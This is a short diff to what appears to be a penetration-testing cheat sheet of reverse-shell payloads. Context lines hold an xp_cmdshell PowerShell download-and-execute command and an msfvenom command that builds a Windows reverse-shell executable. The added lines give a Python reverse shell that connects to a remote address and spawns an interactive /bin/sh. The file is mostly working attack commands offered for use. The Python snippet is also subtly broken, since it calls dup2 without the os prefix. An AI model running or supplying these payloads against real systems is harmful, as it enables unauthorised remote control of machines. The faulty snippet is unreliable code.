@@ -31,3 +31,14 @@ xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.37 LPORT=53 -f exe -o reverse64.exe
 ```
+# python
+
+```
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.14.6",1233));
+dup2(s.fileno(),0); 
+dup2(s.fileno(),1); 
+dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+```
